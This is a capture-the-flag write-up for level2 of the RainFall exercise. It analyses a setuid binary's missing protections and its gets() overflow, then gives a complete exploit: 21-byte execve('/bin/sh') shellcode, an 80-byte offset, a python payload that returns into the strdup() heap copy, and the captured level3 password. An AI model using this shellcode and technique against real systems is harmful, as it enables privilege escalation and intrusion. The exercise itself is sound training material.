Level2's protections:
```Shell
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```

Level2's rights:
```Shell
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
```

When testing the binary, we notice that it waits for user input and prints it back to us.
Decompiling with Ghidra on https://dogbolt.org/ shows four things:
- `main()` calls a `p()` function
- `p()` stores a buffer of 76 bytes that is used with `gets()`
- a condition checks if `EIP` contains an address from the stack (in which case, it prints back the address itself and exits)
- `p()` calls `strdup()` with the same buffer used in `gets()`.

To open a shell, we must therefore do the following:
- write a shellcode that opens a terminal and store it inside the buffer
- redirect the flow of execution at the start of the buffer
- since we cannot use the address of the buffer from the stack (because of the check), we will use the address of its copy
from the heap, thanks to `strdup()` which uses `malloc()`

Let's write a shellcode:
```Shell
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
```
This corresponds to `execve("/bin/sh")`. You can write your own shellcode by writing it in C, doing `objdump()` on the .o
file, copy-pasting the info and add \x in front of each byte. This shellcode is 21-bytes long.
 
Now,using ltrace we can get the return address of `strdup()`, which corresponds to the copied buffer.
```Shell
level2@RainFall:~$ ltrace ./level2
[...]
strdup("") = 0x0804a008
```

Using gdb and a buffer overlow pattern we get an offset of 80 bytes before reaching `EIP`.
(76 for the buffer itself and 4 extra bytes for `EBP`). This will be the structure of our payload:
21-bytes of shellcode + 59-bytes of `NOP` instructions to overflow + address of the `strdup()` buffer converted in Little Endian.
```Shell
level2@RainFall:~$ python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x90" * 59 + "\x08\xa0\x04\x08")' > /tmp/payload2
level2@RainFall:~$ cat /tmp/payload2 - | ./level2
1���
    Qh//shh/bin��̀������������������������������������������������������
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
